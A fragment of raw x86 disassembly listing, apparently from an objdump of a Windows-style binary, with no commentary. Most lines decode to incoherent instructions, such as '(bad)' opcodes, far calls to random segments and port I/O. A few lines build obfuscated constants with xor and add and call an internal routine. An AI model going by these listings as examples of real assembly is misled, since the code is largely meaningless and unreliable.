  41a334:	xor    BYTE PTR [edi+edi*1+0x2128629e],cl
  41a33b:	fwait
  41a33c:	push   es
  41a33d:	in     al,dx
  41a33e:	mov    al,BYTE PTR [edx-0x5aa864d4]
  41a344:	push   edx
  41a345:	push   edx
  41a346:	in     al,dx
  41a347:	mov    ds:0xa35f907e,al
  41a34d:	aas    
  41a34e:	enter  0xf2cc,0x6d
  41a352:	add    eax,0xb1af7145
  41a357:	cmp    al,0x90
  41a359:	in     al,dx
  41a35a:	out    0x93,al
  41a35c:	adc    DWORD PTR [ecx],edi
  41a35e:	ins    BYTE PTR es:[edi],dx
  41a35f:	aaa    
  41a360:	dec    ecx
  41a361:	xlat   BYTE PTR ds:[ebx]
  41a362:	in     eax,dx
  41a363:	and    DWORD PTR [edi-0x315d0267],edi
  41a369:	push   ds
  41a36a:	mov    BYTE PTR [ecx+0x58],al
  41a36d:	aad    0x10
  41a36f:	mov    ebp,0x4c77ddca
  41a374:	loopne 0x41a380
  41a376:	mov    ax,WORD PTR [edi-0x10]
  41a37a:	push   esi
  41a37b:	add    ebx,edx
  41a37d:	shl    DWORD PTR [eax],0x83
  41a380:	cs push ecx
  41a382:	xor    BYTE PTR [ecx+edx*4-0xc52c3b2],bh
  41a389:	in     al,0xaa
  41a38b:	push   esi
  41a38c:	cmc    
  41a38d:	stc    
  41a38e:	mov    cl,BYTE PTR [ecx+eax*4]
  41a391:	push   es
  41a392:	fs xchg ebp,eax
  41a394:	pop    ebp
  41a395:	out    0x72,al
  41a397:	xor    al,0xa1
  41a399:	push   edx
  41a39a:	shl    BYTE PTR [esp+eiz*4+0x3a],1
  41a39e:	ss cmp eax,0xa0e2230
  41a3a4:	sub    DWORD PTR [ebx+ebx*1+0x4a],edx
  41a3a8:	mov    DWORD PTR [edx-0x3d2b45ca],0xb07aae2c
  41a3b2:	jle    0x41a3f6
  41a3b4:	test   al,0xb6
  41a3b6:	jg     0x41a339
  41a3b8:	mov    ?,WORD PTR [ebp+0xa8154ad]
  41a3be:	adc    eax,0x4fbfb20e
  41a3c3:	fcom   DWORD PTR [esi+0x7]
  41a3c6:	sub    ecx,DWORD PTR [ebx+0x75]
  41a3c9:	imul   ecx,DWORD PTR [eax+0x36bb7f0c],0x7950c3a2
  41a3d3:	mov    ecx,DWORD PTR ss:[edi]
  41a3d6:	lods   al,BYTE PTR ds:[esi]
  41a3d7:	stc    
  41a3d8:	enter  0xfa27,0xa5
  41a3dc:	(bad)  
  41a3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3de:	jno    0x41a410
  41a3e0:	ret    0x70c9
  41a3e3:	pop    esp
  41a3e4:	repz jbe 0x41a36f
  41a3e7:	mov    cl,0x49
  41a3e9:	(bad)  
  41a3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3eb:	fldenv [esi+eax*4]
  41a3ee:	xor    al,dh
  41a3f0:	or     DWORD PTR [esi],0xffffffd8
  41a3f3:	lods   eax,DWORD PTR ds:[esi]
  41a3f4:	sbb    DWORD PTR [edx],esi
  41a3f6:	and    esp,DWORD PTR [ebp+0x1b]
  41a3f9:	loopne 0x41a3bc
  41a3fb:	mov    bl,0x92
  41a3fd:	sar    BYTE PTR [edi],1
  41a3ff:	ss inc esp
  41a401:	rcr    DWORD PTR [esi+edi*1-0x4b],cl
  41a405:	test   ebx,0x6441d6a3
  41a40b:	xchg   edi,eax
  41a40c:	ror    ebp,1
  41a40e:	fidiv  DWORD PTR [edi+0xc]
  41a411:	aam    0x11
  41a413:	ret    0xaff
  41a416:	cmp    al,0x8f
  41a418:	sahf   
  41a419:	xor    BYTE PTR [esi-0x27],bl
  41a41c:	sbb    al,0xf1
  41a41e:	fimul  DWORD PTR [edx]
  41a420:	bound  ebp,QWORD PTR [edx]
  41a422:	mov    ebx,0x41aa0835
  41a427:	sub    esi,0xffffffe0
  41a42a:	out    0xdb,al
  41a42c:	call   0xfa53:0x83a3b905
  41a433:	pop    ebp
  41a434:	sub    BYTE PTR [esi-0x4af5b14b],cl
  41a43a:	or     eax,0x79a5423
  41a43f:	xor    DWORD PTR [eax-0x7b],esi
  41a442:	mov    ds:0x13b6c5bc,al
  41a447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a448:	sbb    dl,BYTE PTR [edx-0x21]
  41a44b:	cmp    DWORD PTR [eax+edx*1+0x2c77f4cc],ecx
  41a452:	adc    BYTE PTR [ebx+0x2f8c20f0],ah
  41a458:	pop    edi
  41a459:	xor    BYTE PTR [edx],bl
  41a45b:	enter  0x272e,0xf7
  41a45f:	xchg   esi,eax
  41a460:	cmp    ebp,ebx
  41a462:	(bad)  
  41a463:	sub    eax,0xc49312e4
  41a468:	retf   0x749b
  41a46b:	not    DWORD PTR [ecx-0x62abb8c9]
  41a471:	scas   eax,DWORD PTR es:[edi]
  41a472:	test   ecx,edi
  41a474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a475:	adc    ebx,DWORD PTR [ebx-0x7153ae21]
  41a47b:	pusha  
  41a47c:	cmp    BYTE PTR ds:0xcc9e0081,bl
  41a482:	xor    BYTE PTR [edi-0x73],bl
  41a485:	add    DWORD PTR [eax],ecx
  41a487:	aam    0x36
  41a489:	into   
  41a48a:	push   esi
  41a48b:	ja     0x41a430
  41a48d:	mov    ecx,?
  41a48f:	cmp    ch,BYTE PTR [ebx+0x60]
  41a492:	cld    
  41a493:	push   ebp
  41a494:	add    esi,DWORD PTR [ecx+0x6b]
  41a497:	rcl    BYTE PTR [eax-0x5b],cl
  41a49a:	jae    0x41a428
  41a49c:	retf   
  41a49d:	and    eax,0xe273ced6
  41a4a2:	fild   QWORD PTR [ebx+ecx*2+0x46509bc0]
  41a4a9:	loop   0x41a4e1
  41a4ab:	sbb    al,0x15
  41a4ad:	mov    DWORD PTR [edi+0x21],edi
  41a4b0:	or     ecx,DWORD PTR [ecx]
  41a4b2:	dec    edi
  41a4b3:	lds    ecx,FWORD PTR [ebx]
  41a4b5:	aad    0x7d
  41a4b7:	xor    eax,0xe0a95845
  41a4bc:	aad    0x1b
  41a4be:	or     DWORD PTR [edi],esi
  41a4c0:	adc    bl,BYTE PTR [eax-0x21622cc5]
  41a4c6:	das    
  41a4c7:	pusha  
  41a4c8:	jmp    DWORD PTR [ebx-0x61540e01]
  41a4ce:	dec    edx
  41a4cf:	lahf   
  41a4d0:	push   ebx
  41a4d1:	fsub   DWORD PTR [eax]
  41a4d3:	dec    DWORD PTR [ecx-0x44]
  41a4d6:	push   ds
  41a4d7:	dec    esp
  41a4d8:	out    0xf6,al
  41a4da:	inc    ebx
  41a4db:	retf   0xb89c
  41a4de:	push   0x5b3a6f00
  41a4e3:	icebp  
  41a4e4:	out    dx,eax
  41a4e5:	call   DWORD PTR [edx-0x6a]
  41a4e8:	lods   eax,DWORD PTR ds:[esi]
  41a4e9:	sub    eax,0x99077b99
  41a4ee:	addr16 push 0xffffffb6
  41a4f1:	pop    edx
  41a4f2:	jp     0x41a476
  41a4f4:	xchg   ebx,eax
  41a4f5:	or     ch,0x8e
  41a4f8:	pop    eax
  41a4f9:	bound  esp,QWORD PTR [esi]
  41a4fb:	scas   eax,DWORD PTR es:[edi]
  41a4fc:	sbb    DWORD PTR fs:[ebx+edx*2+0x48],ebx
  41a501:	dec    ebp
  41a502:	pop    es
  41a503:	test   DWORD PTR [esi+0x34c4574a],ebx
  41a509:	sti    
  41a50a:	retf   0xf737
  41a50d:	cli    
  41a50e:	mov    eax,0xe40b3ace
  41a513:	call   0x54a9:0x4f0535cf
  41a51a:	mov    dh,0x57
  41a51c:	cmp    al,0x6a
  41a51e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a51f:	jns    0x41a57d
  41a521:	or     ecx,DWORD PTR [edx+0x1510c341]
  41a527:	imul   BYTE PTR [esi-0x724d4986]
  41a52d:	mov    ds:0xa95a32be,eax
  41a532:	jmp    0x41a581
  41a534:	add    eax,0x80ec356f
  41a539:	mov    ebx,0xb694f9ca
  41a53e:	cmp    BYTE PTR [esi+0x2f3d9099],bh
  41a544:	xchg   edx,eax
  41a545:	sub    ebp,DWORD PTR [ebx+0x77]
  41a548:	or     dh,BYTE PTR [esi-0x36a59682]
  41a54e:	add    esi,DWORD PTR [ebx-0x7e951a02]
  41a554:	lea    esp,[ebx+ebx*2]
  41a557:	or     al,0x32
  41a559:	and    al,0x3b
  41a55b:	xchg   edi,eax
  41a55c:	inc    esi
  41a55d:	cdq    
  41a55e:	add    BYTE PTR [edi-0x645ab9d0],0x1f
  41a565:	mov    esi,ebp
  41a567:	(bad)  
  41a568:	dec    ebx
  41a569:	push   edx
  41a56a:	pop    esi
  41a56b:	jno    0x41a567
  41a56d:	(bad)  
  41a56e:	pop    edi
  41a56f:	ret    0xd419
  41a572:	or     BYTE PTR [edi-0x514eb208],ah
  41a578:	sbb    al,0x5c
  41a57a:	or     bl,0xf9
  41a57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a57e:	mov    esp,0x77eba506
  41a583:	pop    ecx
  41a584:	call   0xc974fbf1
  41a589:	and    eax,0x126764ff
  41a58e:	sbb    BYTE PTR [edx-0x3a31248d],0x19
  41a595:	push   ss
  41a596:	in     eax,0x65
  41a598:	lds    edx,FWORD PTR [ecx-0x6d]
  41a59b:	add    cl,BYTE PTR [ebx+0x1d]
  41a59e:	ret    0x70fe
  41a5a1:	mov    esp,0xbf71c3fc
  41a5a6:	aaa    
  41a5a7:	arpl   WORD PTR [eax-0x3],cx
  41a5aa:	lods   al,BYTE PTR ds:[esi]
  41a5ab:	and    BYTE PTR [eax+0x38b07ee3],bl
  41a5b1:	cmp    DWORD PTR [eax+0x5d527961],ebx
  41a5b7:	mov    ebp,0xf5870259
  41a5bc:	xchg   ecx,eax
  41a5bd:	or     al,0xba
  41a5bf:	xchg   esp,eax
  41a5c0:	mov    ds:0x5c21ae02,eax
  41a5c5:	(bad)
  41a5c8:	mov    ebp,DWORD PTR [edx+0x63d400de]
  41a5ce:	nop
  41a5cf:	push   ebp
  41a5d0:	shl    BYTE PTR [ecx-0x7323612f],0x65
  41a5d7:	push   esp
  41a5d8:	lods   al,BYTE PTR ds:[esi]
  41a5d9:	push   eax
  41a5da:	mul    DWORD PTR [eax]
  41a5dc:	ficomp DWORD PTR [ebp+edx*8-0x51558891]
  41a5e3:	int    0xcd
  41a5e5:	xor    eax,0x773e4c9
  41a5ea:	push   eax
  41a5eb:	jle    0x41a59e
  41a5ed:	psubsw mm0,mm7
  41a5f0:	sbb    eax,ebp
  41a5f2:	and    dl,ah
  41a5f4:	jecxz  0x41a5e6
  41a5f6:	ds lock mov gs,esi
  41a5fa:	xchg   DWORD PTR [edx-0x2f8b6acf],ecx
  41a600:	mov    edi,0xbd06a538
  41a605:	cmp    BYTE PTR [eax-0x77],dl
  41a608:	in     eax,0x8c
  41a60a:	adc    al,dl
  41a60c:	mov    ds:0x17d6b419,eax
  41a611:	in     eax,0x28
  41a613:	xor    al,0x3b
  41a615:	or     edi,ebp
  41a617:	(bad)
  41a61b:	xor    DWORD PTR [eax+0x40186f2d],0x35e9479b
  41a625:	scas   eax,DWORD PTR es:[edi]
  41a626:	or     eax,0x3749167a
  41a62b:	mov    ebx,0x8cbe3f1c
  41a630:	sti    
  41a631:	inc    esi
  41a632:	inc    eax
  41a633:	ja     0x41a5b5
  41a635:	pop    es
  41a636:	test   ch,0xc1
  41a639:	sub    al,0x1b
  41a63b:	es arpl cx,cx
  41a63e:	icebp  
  41a63f:	iret   
  41a640:	and    al,0x1
  41a642:	sti    
  41a643:	sbb    ch,BYTE PTR [eax-0x97cd031]
  41a649:	ins    DWORD PTR es:[edi],dx
  41a64a:	fs pushf 
  41a64c:	cmp    ch,cl
  41a64e:	push   eax
  41a64f:	dec    eax
  41a650:	rol    BYTE PTR [esi],cl
  41a652:	adc    BYTE PTR [eax+0x6c],bl
  41a655:	dec    ebp
  41a656:	adc    eax,0x1a083e9f
  41a65b:	call   0x4c8b:0xc12b5232
  41a662:	and    al,0x50
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x422074
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	popa   
  41a749:	cld    
  41a74a:	jne    0x41a7c8
  41a74c:	iret   
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1-0x35a1e7e8],bh
  41a756:	jge    0x41a736
  41a758:	out    0x3a,al
  41a75a:	(bad)  [eax-0x37]
  41a75d:	jno    0x41a7a3
  41a75f:	push   ecx
  41a760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a761:	sbb    BYTE PTR [edi],0xcf
  41a764:	aam    0xa6
  41a766:	scas   al,BYTE PTR es:[edi]
  41a767:	inc    eax
  41a768:	loope  0x41a76f
  41a76a:	pop    ebx
  41a76b:	adc    eax,0xbd7ccd42
  41a770:	aaa    
  41a771:	mov    ebp,0xb8cb78ab
  41a776:	jb     0x41a735
  41a778:	pop    edi
  41a779:	loopne 0x41a7d0
  41a77b:	xchg   esp,eax
  41a77c:	jnp    0x41a74c
  41a77e:	ss (bad) 
  41a780:	scas   eax,DWORD PTR es:[edi]
  41a781:	pop    ss
  41a782:	xor    al,BYTE PTR [esi+0xd55d5ee]
  41a788:	adc    ch,0xfb
  41a78b:	icebp  
  41a78c:	int    0x28
  41a78e:	xor    bl,BYTE PTR [edi-0x1aba1c04]
  41a794:	or     edi,DWORD PTR [ecx+0x131aac96]
  41a79a:	push   edi
  41a79b:	pusha  
  41a79c:	int    0xbf
  41a79e:	shr    BYTE PTR [edx-0x4b],1
  41a7a1:	push   edi
  41a7a2:	jne    0x41a764
  41a7a4:	in     eax,dx
  41a7a5:	ins    BYTE PTR es:[edi],dx
  41a7a6:	fxtract 
  41a7a8:	lea    ecx,[ebp-0x11bf9027]
  41a7ae:	mov    al,0x8c
  41a7b0:	or     DWORD PTR [ebp-0x5a],edx
  41a7b3:	imul   edx,DWORD PTR [ecx+0x50],0x4fcfb0ab
  41a7ba:	xor    DWORD PTR [ebx-0x5e3cd295],ebx
  41a7c0:	push   ss
  41a7c1:	push   0x20f224e7
  41a7c6:	lds    edx,FWORD PTR [ecx+0x2e1ad4ec]
  41a7cc:	daa    
  41a7cd:	retf   0x8e79
  41a7d0:	aad    0x75
  41a7d2:	cld    
  41a7d3:	push   ebx
  41a7d4:	test   BYTE PTR [edx],dh
  41a7d6:	fs repz ret 0x7ca8
  41a7db:	xor    DWORD PTR [edx],eax
  41a7dd:	jno    0x41a78d
  41a7df:	and    BYTE PTR [ebp+0x43889b87],dh
  41a7e5:	ja     0x41a844
  41a7e7:	and    ecx,DWORD PTR [ecx-0x52]
  41a7ea:	scas   eax,DWORD PTR es:[edi]
  41a7eb:	cmp    bh,dh
  41a7ed:	ret    
  41a7ee:	fmul   QWORD PTR [ebx-0x55]
  41a7f1:	jmp    0x8e:0xe433b880
  41a7f8:	push   edi
  41a7f9:	jle    0x41a77d
  41a7fb:	mov    ?,WORD PTR [edx+0x6b30344c]
  41a801:	popa   
  41a802:	push   edx
  41a803:	mov    ecx,0x5895d22
  41a808:	enter  0xa217,0xce
  41a80c:	gs nop
  41a80e:	retf   
  41a80f:	adc    dl,bh
  41a811:	arpl   ax,di
  41a813:	or     al,BYTE PTR [eax+esi*1-0x24f3cd61]
  41a81a:	ja     0x41a7b1
  41a81c:	jle    0x41a7b8
  41a81e:	add    ch,BYTE PTR [edx+0x3]
  41a821:	mov    al,ds:0xd6bff0dc
  41a826:	xchg   ebx,eax
  41a827:	in     al,0x9f
  41a829:	mov    eax,ds:0x731b9a04
  41a82e:	xor    BYTE PTR [edi],dh
  41a830:	ss push ds
  41a832:	or     BYTE PTR [ecx+0x3e75c2c3],0x8e
  41a839:	sub    al,0x4e
  41a83b:	gs cld 
  41a83d:	jle    0x41a7ef
  41a83f:	or     DWORD PTR [ecx+0x2d],ecx
  41a842:	ja     0x41a832
  41a844:	std    
  41a845:	cld    
  41a846:	mov    esi,0x1a19ddd7
  41a84b:	adc    DWORD PTR [edi+0x28],edi
  41a84e:	lock adc ah,bh
  41a851:	(bad)  
  41a852:	out    0x6c,eax
  41a854:	ror    DWORD PTR [ecx-0x752e4840],1
  41a85a:	mov    eax,0xe4666a5f
  41a85f:	adc    eax,0x2af38c05
  41a864:	mov    fs:0xc1779d9c,eax
  41a86a:	daa    
  41a86b:	add    esi,DWORD PTR [ebx+0x35]
  41a86e:	or     ebp,DWORD PTR [ebx+0x4]
  41a871:	psrlw  mm2,QWORD PTR [ebp+0x241869d1]
  41a878:	xchg   DWORD PTR [esp+edx*8],eax
  41a87b:	ret    0x7642
  41a87e:	lds    esp,FWORD PTR [edi]
  41a880:	push   esp
  41a881:	stc    
  41a882:	js     0x41a8ee
  41a884:	and    BYTE PTR [esp+esi*8-0x512c7c81],0x28
  41a88c:	xor    bh,BYTE PTR [esi-0x1d]
  41a88f:	rol    BYTE PTR [edi],cl
  41a891:	mov    ah,0x25
  41a893:	mov    ?,WORD PTR [ecx+ebp*4+0x7b]
  41a897:	mov    edi,DWORD PTR [esi-0x73]
  41a89a:	icebp  
  41a89b:	adc    al,0x92
  41a89d:	mov    ch,0x17
  41a89f:	leave  
  41a8a0:	loopne 0x41a8cb
  41a8a2:	push   edx
  41a8a3:	dec    esi
  41a8a4:	adc    dl,dh
  41a8a6:	out    0x72,al
  41a8a8:	cmc    
  41a8a9:	mov    eax,0xfada237
  41a8ae:	mov    esp,0x18ca7a82
  41a8b3:	sub    al,0xc1
  41a8b5:	adc    DWORD PTR [esi+0x3a450950],edi
  41a8bb:	stc    
  41a8bc:	mov    eax,ds:0x48e899fc
  41a8c1:	lds    bp,DWORD PTR [edx+0x6dfc4ed8]
  41a8c8:	jbe    0x41a899
  41a8ca:	loope  0x41a93c
  41a8cc:	clc    
  41a8cd:	mov    WORD PTR ds:0x86ee7aa6,fs
  41a8d3:	push   ds
  41a8d4:	jmp    0x5d00:0xd64f8e50
  41a8db:	pop    ecx
  41a8dc:	fmul   st,st(0)
  41a8de:	js     0x41a936
  41a8e0:	bound  eax,QWORD PTR [ecx-0xc]
  41a8e3:	pop    es
  41a8e4:	xor    BYTE PTR [ebx],dh
  41a8e6:	clc    
  41a8e7:	ins    BYTE PTR es:[edi],dx
  41a8e8:	push   edi
  41a8e9:	pop    ecx
  41a8ea:	(bad)  
  41a8eb:	adc    ah,BYTE PTR [esi-0x3e9c3f0e]
  41a8f1:	cwde   
  41a8f2:	fdivr  DWORD PTR [esi-0x179fed13]
  41a8f8:	fiadd  WORD PTR [eax-0x4f]
  41a8fb:	inc    ebp
  41a8fc:	into   
  41a8fd:	push   ebp
  41a8fe:	ja     0x41a8b7
  41a900:	stos   BYTE PTR es:[edi],al
  41a901:	out    0x94,al
  41a903:	jmp    FWORD PTR [ebp+0x48]
  41a906:	fs clc 
  41a908:	rcr    BYTE PTR ds:0x233b1dc,0xc6
  41a90f:	xchg   ebx,eax
  41a910:	push   ebx
  41a911:	dec    esp
  41a912:	add    BYTE PTR [ecx+0x7e],0x56
  41a916:	sub    BYTE PTR [eax+0x7e3646d5],al
  41a91c:	or     BYTE PTR [edi-0x36],cl
  41a91f:	mov    cl,0x0
  41a921:	push   cs
  41a922:	mov    eax,0x9563f6f1
  41a927:	dec    ebx
  41a928:	fisubr DWORD PTR [edi-0x1e]
  41a92b:	in     al,0xda
  41a92d:	pushf  
  41a92e:	mov    esi,0x146ff9e3
  41a933:	or     BYTE PTR [eax+0x1f],bl
  41a936:	dec    edi
  41a937:	mov    edx,DWORD PTR ds:0x63f249ff
  41a93d:	xchg   DWORD PTR [ecx],edx
  41a93f:	xor    DWORD PTR [ecx+0x7ad4f563],ebp
  41a945:	push   0x78
  41a947:	cli    
  41a948:	inc    ecx
  41a949:	sub    al,0x6a
  41a94b:	pop    ebx
  41a94c:	jg     0x41a949
  41a94e:	xor    ch,bl
  41a950:	ret    0x3e4
  41a953:	mov    WORD PTR [ecx+0x7ea6bf0a],gs
  41a959:	xor    eax,0xc10a666c
  41a95e:	retf   0x3134
  41a961:	repz call 0x498c53a6
  41a967:	xor    al,0xb2
  41a969:	pop    edi
  41a96a:	imul   esp,edi,0xb
  41a96d:	fnstcw WORD PTR [ebx-0x1f52003]
  41a973:	mul    BYTE PTR [esi-0x713ffa41]
  41a979:	mov    DWORD PTR [eax+0x6356986e],eax
  41a97f:	push   cs
  41a980:	test   BYTE PTR [ebp+edi*4+0x59],0x30
  41a985:	xchg   DWORD PTR [ecx-0x4c8aefbf],edx
  41a98b:	xchg   ebx,eax
  41a98c:	(bad)  
  41a98d:	pushf  
  41a98e:	cld    
  41a98f:	jg     0x41a960
  41a991:	ds das 
  41a993:	sub    DWORD PTR [eax+edx*4+0x57bb4438],eax
  41a99a:	sub    DWORD PTR [eax+0x42e93612],0x6e
  41a9a1:	or     esi,DWORD PTR [ecx-0x31]
  41a9a4:	shl    DWORD PTR [ebp-0x7db58c91],1
  41a9aa:	int    0x1
  41a9ac:	les    ecx,FWORD PTR [ebx]
  41a9ae:	(bad)  
  41a9af:	out    0x95,al
  41a9b1:	icebp  
  41a9b2:	ret    0xf1d0
  41a9b5:	mov    eax,ds:0x5ab1da14
  41a9ba:	and    al,0x99
  41a9bc:	inc    ebx
  41a9bd:	jno    0x41a9f8
  41a9bf:	push   ds
  41a9c0:	add    DWORD PTR [ebx+0x7a873d62],edi
  41a9c6:	ins    BYTE PTR es:[edi],dx
  41a9c7:	inc    ebx
  41a9c8:	xchg   edx,eax
  41a9c9:	jno    0x41aa32
  41a9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9cc:	jle    0x41a9dd
  41a9ce:	mov    cl,0x1c
  41a9d0:	and    ebx,DWORD PTR [edx+0x60]
  41a9d3:	push   esi
  41a9d4:	mov    ah,0x69
  41a9d6:	retf   0x2411
  41a9d9:	sbb    DWORD PTR [ecx+0xa],esp
  41a9dc:	sub    al,0x35
  41a9de:	sbb    bh,ah
  41a9e0:	mov    ds:0x463a6ed3,eax
  41a9e5:	inc    esi
  41a9e6:	sbb    bl,dl
  41a9e8:	retf   0xc6d5
  41a9eb:	dec    edx
  41a9ec:	rcl    esi,1
  41a9ee:	mov    ebp,DWORD PTR [edx]
  41a9f0:	jle    0x41aa58
  41a9f2:	pop    ds
  41a9f3:	les    edx,FWORD PTR [ebp-0x2b887e4c]
  41a9f9:	mov    dh,0x40
  41a9fb:	pop    ss
  41a9fc:	ins    DWORD PTR es:[edi],dx
  41a9fd:	pop    ss
  41a9fe:	dec    eax
  41a9ff:	(bad)  
  41aa00:	push   0x1d
  41aa02:	aad    0x82
  41aa04:	lock inc esi
  41aa06:	mov    edi,0xadef643e
  41aa0b:	sbb    al,0xc
  41aa0d:	loopne 0x41a9ed
  41aa0f:	(bad)  
  41aa10:	cmc    
  41aa11:	stos   BYTE PTR es:[edi],al
  41aa12:	stos   BYTE PTR es:[edi],al
  41aa13:	jg     0x41a9c3
  41aa15:	push   ebp
  41aa16:	pop    ds
  41aa17:	mov    DWORD PTR [edi-0x7b],0x3ba33b34
  41aa1e:	jl     0x41aa46
  41aa20:	scas   al,BYTE PTR es:[edi]
  41aa21:	push   edx
  41aa22:	call   0xa36b:0xe1a337c2
  41aa29:	addr16 push 0x3c90b197
  41aa2f:	fcomp  st(7)
  41aa31:	in     eax,0x57
  41aa33:	sub    eax,0x1b4b692d
  41aa38:	sbb    al,0x59
  41aa3a:	aam    0x59
  41aa3c:	xchg   ecx,eax
  41aa3d:	mov    ch,cl
  41aa3f:	daa    
  41aa40:	loope  0x41aa1b
  41aa42:	pop    ss
  41aa43:	in     eax,dx
  41aa44:	and    esp,DWORD PTR [esi+0x6b21788f]
  41aa4a:	xchg   DWORD PTR [ebx],ebp
  41aa4c:	ja     0x41aa00
  41aa4e:	mov    bh,0xfd
  41aa50:	push   ebx
  41aa51:	dec    ecx
  41aa52:	mov    ch,0xd
  41aa54:	test   DWORD PTR [ecx-0x633fed07],edi
  41aa5a:	dec    ecx
  41aa5b:	scas   eax,DWORD PTR es:[edi]
  41aa5c:	cmc    
  41aa5d:	push   edx
  41aa5e:	xchg   ebx,eax
  41aa5f:	jnp    0x41aabc
  41aa61:	mov    ch,0x14
  41aa63:	call   0xa037:0x53cdc08d
  41aa6a:	sub    dl,al
  41aa6c:	retf   
  41aa6d:	les    esi,FWORD PTR [eax-0xb21b747]
  41aa73:	sbb    DWORD PTR [esi+0x4f],0xffffffc6
  41aa77:	pop    ds
  41aa78:	xchg   BYTE PTR [eax],ch
  41aa7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa7b:	scas   ax,WORD PTR es:[edi]
  41aa7d:	mov    DWORD PTR [ecx],eax
  41aa7f:	sar    DWORD PTR [edi+0x2b],0x8b
  41aa83:	enter  0x1858,0x3b
  41aa87:	cmc    
  41aa88:	pop    esp
  41aa89:	jae    0x41aa69
  41aa8b:	(bad)  
  41aa8c:	jnp    0x41aa71
  41aa8e:	std    
  41aa8f:	je     0x41aaaf
  41aa91:	cmp    esi,DWORD PTR [ecx+eiz*2+0x46d2c876]
  41aa98:	jno    0x41aaff
  41aa9a:	jge    0x41aa36
  41aa9c:	adc    dh,BYTE PTR [eax+0x5f4b591d]
  41aaa2:	dec    edx
  41aaa3:	mul    bh
  41aaa5:	push   edi
  41aaa6:	les    edx,FWORD PTR [ecx+ebx*8]
  41aaa9:	lods   al,BYTE PTR ds:[esi]
  41aaaa:	adc    edi,0x75
  41aaad:	sub    DWORD PTR [edx-0x78b33697],ebx
  41aab3:	jp     0x41aae5
  41aab5:	xor    al,0x6a
  41aab7:	mov    ah,0x46
  41aab9:	ds mov ah,0x79
  41aabc:	inc    ebx
  41aabd:	xor    DWORD PTR [edx-0x43ce7b42],esi
  41aac3:	(bad)  
  41aac4:	fidiv  WORD PTR [eax+0x2a7c4ed8]
  41aaca:	dec    ebx
  41aacb:	rcr    DWORD PTR [edx+0x6e],cl
  41aace:	scas   eax,DWORD PTR es:[edi]
  41aacf:	rol    BYTE PTR [edx],0xa6
  41aad2:	arpl   dx,bp
  41aad4:	cmp    al,0x63
  41aad6:	test   eax,0x9b76cbae
  41aadb:	hlt    
  41aadc:	add    BYTE PTR ds:0x6c275c90,ah
  41aae2:	outs   dx,DWORD PTR ds:[esi]
  41aae3:	lahf   
  41aae4:	lahf   
  41aae5:	iret   
  41aae6:	inc    ebp
  41aae7:	push   ss
  41aae8:	popf   
  41aae9:	mov    WORD PTR [eax+0x5b],cs
  41aaec:	cmc    
  41aaed:	sbb    al,0x5a
  41aaef:	or     DWORD PTR [ebx-0x1a],0xffffffaf
  41aaf3:	jae    0x41aa90
  41aaf5:	add    cl,BYTE PTR [eax]
  41aaf7:	pop    esi
  41aaf8:	in     al,dx
  41aaf9:	mov    ebp,DWORD PTR [edi-0x69]
  41aafc:	(bad)  
  41aafd:	loope  0x41aaf8
  41aaff:	jp     0x41ab3d
  41ab01:	cld    
  41ab02:	cs dec edi
  41ab04:	pusha  
  41ab05:	in     eax,0x8b
  41ab07:	pop    esp
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x422074
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x422074
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
